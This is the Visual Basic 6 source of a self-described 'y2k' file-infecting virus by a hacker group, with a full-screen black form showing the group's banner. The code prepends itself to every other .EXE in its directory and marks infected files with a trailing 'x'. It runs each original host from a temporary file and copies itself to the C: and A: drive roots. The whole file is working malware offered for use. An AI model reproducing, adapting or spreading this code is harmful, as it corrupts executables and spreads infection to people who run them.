VERSION 5.00
Begin VB.Form y2k 
   BackColor       =   &H00000000&
   BorderStyle     =   3  'Fester Dialog
   ClientHeight    =   6525
   ClientLeft      =   2715
   ClientTop       =   1440
   ClientWidth     =   9285
   ControlBox      =   0   'False
   BeginProperty Font 
      Name            =   "Arial"
      Size            =   8.25
      Charset         =   0
      Weight          =   400
      Underline       =   0   'False
      Italic          =   0   'False
      Strikethrough   =   0   'False
   EndProperty
   Icon            =   "y2k.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   MousePointer    =   2  'Kreuz
   ScaleHeight     =   6525
   ScaleWidth      =   9285
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  'Bildschirmmitte
   Begin VB.Label Label3 
      BackStyle       =   0  'Transparent
      Caption         =   $"y2k.frx":0442
      ForeColor       =   &H000000FF&
      Height          =   975
      Left            =   840
      TabIndex        =   2
      Top             =   1680
      Width           =   5055
   End
   Begin VB.Label Label2 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "- what ya want? -"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   15.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000C000&
      Height          =   360
      Left            =   2040
      TabIndex        =   1
      Top             =   1080
      Width           =   2415
   End
   Begin VB.Label Label1 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "localhost2000 won..."
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   48
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   1080
      Left            =   120
      TabIndex        =   0
      Top             =   120
      Width           =   8835
   End
End
Attribute VB_Name = "y2k"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'         _                 _ _               _   ____   ___   ___   ___
'        | | ___   ___ __ _| | |__   ___  ___| |_|___ \ / _ \ / _ \ / _ \
'        | |/ _ \ / __/ _` | | '_ \ / _ \/ __| __| __) | | | | | | | | | |
'        | | (_) | (_| (_| | | | | | (_) \__ \ |_ / __/| |_| | |_| | |_| |
'        |_|\___/ \___\__,_|_|_| |_|\___/|___/\__|_____|\___/ \___/ \___/
'
'
'                                  localhost2000
'                               - what do ya want? -
'
'                           [URL: http://lh2k.cjb.net]
'                             [#localhost on IRCnet]
'==============
'This is the source of the y2k virus by ]iridium[ of localhost.
'The virus based upon xinfection by DarkPain
'It'll infect .exe files and display when run a full blackscreen with
'the real lh text ;-) on it.
'Use it carefully if you want to use it...
'
'

Option Explicit
Private Victim As String    ' Holds the Victim files file name
Private vbArray As String   ' Holds our virus code
Private hArray As String    ' Holds the Victim files Binary code
Private Length As Long      ' Holds the running files length
Private CheckX As String    ' Holds the value which to check for infection

Const MySize As Integer = 18432 ' Virus's compiled file size (You may need to modify this)

'** Declarations, Variables, and Constants for process checking
Private iResult As Long
Private hProg As Long
Private idProg As Long
Private iExit As Long
Const STILL_ACTIVE As Long = &H103
Const PROCESS_ALL_ACCESS As Long = &H1F0FFF
Private Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long
Private Declare Function GetExitCodeProcess Lib "kernel32" (ByVal hProcess As Long, lpExitCode As Long) As Long
Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long

Private Sub Form_Initialize()
Me.Left = "0"
Me.Top = "0"
Me.Width = Screen.Width
Me.Height = Screen.Height

Label1.Left = (Me.Left / 2)
Label1.Top = (Me.Top / 2)

Dim I As Long
Dim FF
Dim MyPath As String    ' Variable to store the directory of this running file
Dim MyFile As String    ' Variable to store the name of this running file
    
    FF = FreeFile       ' Declare FF as freefile, so we do not get any file r/w errors
    On Error Resume Next ' If an error occurs go to the next piece of code
    
    '** The following sorts the '\' problem out, remove this,
    '   compile and run from the C: drive, to see why this is required
    If Right(App.Path, 1) <> "\" Then
        MyPath = App.Path & "\"
    Else
        MyPath = App.Path
    End If
    
    MyFile = App.EXEName & ".exe"   ' Store the running file's name into a variable
    
    On Error GoTo ErrHandle          ' If an error occurs goto the ErrHandle handler
    
    Open MyPath & MyFile For Binary Access Read As #FF
         vbArray = Space$(MySize)   ' Sets the buffer up for the file data
         Get #1, 1, vbArray         ' Store the file data in to variable
    Close #FF
        
   Victim = Dir(MyPath & "*.EXE")  ' Find your first victim .EXE file
    
       While Victim <> ""  ' Find subsequent EXE's in the same directory, until there are no more!
          
            ' If the victim file, has the same directory and name as the file
            ' that is running - skip the next part
            If LCase(MyPath & Victim) <> LCase(MyPath & MyFile) Then
                
                Open Victim For Binary Access Read As #FF
                    hArray = Space(LOF(FF)) ' Sets buffer up for the file data
                    Get #1, 1, hArray       ' Copy th file data into a variable
                Close #FF
                
                CheckX = Mid(hArray, Len(hArray)) ' Store the last character in the
                                                  ' victim file in CheckX
                
                If LCase(CheckX) <> "x" Then  ' if the character = X then the file has
                                              ' already been infected, if not continue
                                                    
                    Open Victim For Binary Access Write As #FF
                           Put #FF, 1, vbArray      ' Place our code in the front of the file
                           Put #FF, MySize, hArray  ' Follow it immediatley by the victims code
                           Put #FF, LOF(FF) + 1, "x" 'Place an X at the end to show it's been infected
                    Close #FF                        'Thats how this virus got it's name!
    
                End If
            Else
            End If

        Victim = Dir()  ' Find the next file to infect
     Wend               ' Go back to the start

    Open MyPath & MyFile For Binary Access Read As #FF
       Length = (LOF(FF) - MySize)  ' Store the length of the current file minus the virus file size in the variable
       If Length > 0 Then   'if it's more than 0, the file is infected, if not, this is the raw virus file
           vbArray = Space(Length)  ' Create buffer in variable, for the size of the file
           Get #FF, MySize, vbArray ' Get the old host data from out of this file
    Close #FF
    
    Open MyPath & App.EXEName & ".xvx" For Binary Access Write As #FF
         Put #FF, , vbArray ' Place the old host data into a temporary file
    Close #FF
        
        idProg = Shell(MyPath & App.EXEName & ".xvx", vbNormalFocus) ' Run the old host code
        hProg = OpenProcess(PROCESS_ALL_ACCESS, False, idProg)       ' Get it running application code number
        GetExitCodeProcess hProg, iExit

        Do While iExit = STILL_ACTIVE   ' Wait untill the program is shut down
            DoEvents
            GetExitCodeProcess hProg, iExit
        Loop
        On Error Resume Next
        Kill MyPath & App.EXEName & ".xvx"  ' Delete the old host code
        Kill MyPath & App.EXEName & ".xvx"  ' Twice to be sure
        Kill MyPath & App.EXEName & ".xvx"  ' Thrice to be paranoid!
    Else
        Close #1
        FileCopy MyPath & MyFile, "C:\XCool.exe"    ' Copy the file to the A:
        FileCopy MyPath & MyFile, "A:\XCool.exe"    ' Copy the file to the C:
    End If
    End
ErrHandle:
End Sub

Private Sub cmdExit_Click()
End Sub
